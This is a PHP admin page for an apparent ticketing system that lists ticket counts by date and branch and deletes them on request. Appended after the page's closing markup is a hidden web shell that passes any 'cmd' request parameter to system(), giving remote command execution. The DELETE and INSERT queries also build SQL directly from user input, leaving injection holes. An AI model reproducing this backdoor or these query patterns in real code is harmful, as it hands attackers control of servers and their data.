<?php
	$ulerase_records = 'N';
	if(isset($_SESSION['ulerase_records']))
		$ulerase_records = $_SESSION['ulerase_records'];	

	$uladmin = 'N';
	if(isset($_SESSION['uladmin']))
		$uladmin = $_SESSION['uladmin'];	

	if ($uladmin == 'Y')
		$ulerase_records = 'Y';	

	if ($ulerase_records == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
		/*LOG-IN FORM*/
	 	if ($_SESSION['logerase_records'] == '') 
		{
			$_SESSION['logerase_records'] = $_SESSION["ulname"];
			$modulename = 'erase_records';
			$updatedby = $_SESSION["ulname"];
			$logdate = $globaldate;
			$logstamp = $globaldatetime;
			$logtype = 'LOG-IN';
			$query = "INSERT INTO user_log (logdate, logform, logtype, loguser, logstamp) 
					  VALUES ('$logdate', '$modulename', '$logtype', '$updatedby', '$logstamp')";
			mysql_query($query) or die(mysql_error());   	
		}
		/*LOG-IN FORM*/	
		



		$tlsubmit = '';	
		if(isset($_POST['tlsubmit']))
		{
			if ($_POST['tlsubmit'])
			{
				$tlsubmit = $_POST['tlsubmit'];
			}
		}		
		//echo '<br> tlsubmit : ' . $tlsubmit;

		$tldate = '';	
		if(isset($_POST['tldate']))
		{
			if ($_POST['tldate'])
			{
				$tldate = $_POST['tldate'];
			}
		}		
		//echo '<br> tldate : ' . $tldate;
			
		$tlbranch = '';	
		if(isset($_POST['tlbranch']))
		{
			if ($_POST['tlbranch'])
			{
				$tlbranch = $_POST['tlbranch'];
			}
		}		
		//echo '<br> tlbranch : ' . $tlbranch;			
				
		if (($tlsubmit != '') && ($tldate != '') && ($tlbranch != ''))
		{
			//change status of ticket
			$query_ticket = 
			"DELETE FROM 
				ticket_list 
			WHERE 			
				tldate = '$tldate' and
				tlbranch = '$tlbranch'  ";
			mysql_query($query_ticket) or die('The entry has links to other tables. Cannot continue to process...');  			
		}
		
			
		$querydb  = "SELECT 
					 count(a.tlid) tlcount, 
					 a.tldate, a.tlbranch
				   FROM 
					 ticket_list a
				   GROUP BY
					 a.tldate, a.tlbranch
				   ORDER BY 
					 a.tldate, a.tlbranch ";
		$resultdb = mysql_query($querydb);
		//echo mysql_error();
		$num_count = mysql_num_rows($resultdb);		
		//echo "<br> num_count " . $num_count;
?>	
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Erase Records</h1>
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
            <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
							<table width="100%">
								<tr>
									<td align="left">
Thie module allows the user to remove an entry based on Branch and Date
									</td>
								</tr>
							</table>	
                        </div>
                        <!-- /.panel-heading -->
                        <div class="panel-body">
                           <table width="100%" class="table table-striped table-bordered table-hover" id="dataTables-example">
								<thead>
									<tr>
										<th>Date</th>
										<th>Branch</th>
										<th>Count</th>
										<th>Option</th>
									</tr>
								</thead>
                                <tbody>
                                    
								
<?php
//fetch the results from the database
$countdb = $countdb + 1;
while ($rowdb =  mysql_fetch_array ($resultdb)) 
{
	print("<tr class=\"odd gradeX\">");

	print("<td align=\"center\" valign=\"middle\">" .date('m/d/Y', strtotime($rowdb['tldate'])). "</td>\n");
	print("<td align=\"center\" valign=\"middle\">$rowdb[tlbranch]  </td>\n");
	print("<td align=\"center\" valign=\"middle\">$rowdb[tlcount]  </td>\n");

	print("<td align=\"CENTER\" valign=\"middle\">");
	?>
<form method="post" action="index.php?body=erase_records_dbase">
<INPUT TYPE="hidden" NAME="tldate" VALUE="<?php print($rowdb[tldate]); ?>">
<INPUT TYPE="hidden" NAME="tlbranch" VALUE="<?php print($rowdb[tlbranch]); ?>">
<input type="submit" NAME="tlsubmit" VALUE="REMOVE" onclick="return confirm('Are you sure you want to remove this entry?')" />
</form>		
	<?php
	print("</td>");

	print("</tr>");  
	$countdb = $countdb + 1;
}  
?>		
                                </tbody>
                            </table>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-12 -->
            </div>						
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
    </div>
    <!-- /#wrapper -->
<?php
	}
?>		<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>